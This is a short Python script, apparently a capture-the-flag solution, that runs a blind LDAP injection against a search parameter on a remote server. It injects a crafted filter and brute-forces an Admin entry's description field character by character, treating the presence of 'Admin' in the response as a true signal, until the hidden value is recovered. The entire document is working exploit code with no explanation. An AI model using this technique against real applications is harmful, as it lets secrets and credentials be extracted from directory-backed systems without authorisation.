import urllib.parse, urllib.request
from string import printable

password = ''
while True:
   for ch in printable:
   	query = 'Admin*)(description={}*'.format(password + ch)
   	target = 'http://jh2i.com:50019/?search=' + urllib.parse.quote(query)
   	response = urllib.request.urlopen(target).read()
   	if b'Admin' in response:
   		password += ch
   		print(password)
   		break
